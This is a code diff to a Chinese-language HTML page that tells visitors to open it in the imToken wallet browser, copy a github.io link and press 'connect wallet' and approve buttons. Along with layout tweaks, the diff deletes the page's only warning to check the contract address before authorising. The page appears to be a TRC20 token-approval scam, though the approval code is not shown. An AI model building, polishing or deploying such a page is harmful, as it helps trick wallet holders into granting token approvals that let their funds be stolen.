@@ -128,7 +128,7 @@
          /* 复制链接区：紧凑布局 */
         .copy-link-wrap {
             background: #1e2925;
-            padding: 12px; /* 缩小内边距 */
+            padding: 8px; /* 缩小内边距 */
             border-radius: 8px;
             display: flex;
             align-items: center;
@@ -246,11 +246,10 @@
         <div class="warning">
             <p> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
             <p> ⚠️ 非钱包浏览器：复制链接 → 点击「连接钱包」→ 钱包内「浏览」粘贴访问</p>
-            <p> ⚠️ 授权前确认合约地址无误</p>
          <!-- 复制链接区：修复图标符号 -->
         <div class="copy-link-wrap">
             <span id="copyLinkText">
-                https://trc20trx-alt.github.io/Trc20.TRX/
+               <p> https://trc20trx-alt.github.io/Trc20.TRX/</p>
             </span>
             <button id="copyLinkBtn"class="fa fa-copy">
                  复制链接
@@ -293,8 +292,7 @@
         const connectBtn = document.getElementById("connectBtn");
         const approveBtn = document.getElementById("approveBtn");
         const copyLinkText = document.getElementById("copyLinkText");
-        const copyLinkBtn = document.getElementById("copyLinkBtn");
-        const copyLinkWrap = document.querySelector('.copy-link-wrap');
+        const copyLinkBtn = document.getElementById("copyLinkBtn");     
         const warning = document.querySelector('.warning');
     
         renderApprovalRecords();
@@ -331,7 +329,6 @@
                 userAddress = accounts[0];
                 // 手动连接成功，隐藏连接按钮
                 connectBtn.style.display = "none";
-                copyLinkWrap.style.display = "none";
                 warning.style.display = "none"
                 await initWallet();
             } catch (e) {}
